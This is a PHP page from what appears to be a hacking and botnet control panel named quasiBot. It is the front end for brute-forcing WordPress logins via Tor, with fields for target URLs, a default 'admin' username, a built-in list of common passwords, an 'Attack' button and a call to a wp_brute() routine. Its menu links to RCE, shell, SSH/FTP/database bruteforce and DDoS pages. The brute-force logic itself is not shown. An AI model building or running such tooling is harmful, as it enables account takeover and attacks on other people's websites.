<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | www</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Wordpress</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                    Wordpress CMS Bruteforce &nbsp;&bull;&nbsp; via tor
                            </p>

  <form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' id='Box'>
    <tr>
<td width='4%'>&nbsp;</td>
</tr>
    <tr>
      <td >&nbsp;</td>
      <td ><p><b>URL's</b></p></td>
      <td ><p><b>Users</b></p></td>
      <td ><p><b>Passwords</b></p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea name="usernames" cols="20" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
      <td ><textarea name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\nadmin2012\nadmin2013\nadmin2014\npassword";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input type="submit" name="submit" value="Attack" class="submit"  />
</td></tr>
</table></form>
                        </div>
                    </div> 

                    <?php
                    wp_brute();
                    ?>


                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="../home/index.php">Index</a></li>
                                <li><a href="../home/settings.php">Settings</a></li>
                                <li><a href="../home/rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="../hack/rce.php">RCE</a></li>
                                <li><a href="../hack/scan.php">Scan</a></li>
                                <li><a href="../hack/pwn.php">Pwn</a></li>
                                <li><a href="../hack/shell.php">Shell</a></li>
                            </ul>
                        </li>
                        <li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="ssh.php">SSH</a></li>
                                <li><a href="ftp.php">FTP</a></li>
                                <li><a href="dbs.php">DB's</a></li>
                                <li><a href="www.php"><b>WWW</b></a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="../hack/ddos.php">DDoS</a></li>
                                <li><a href="../hack/more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
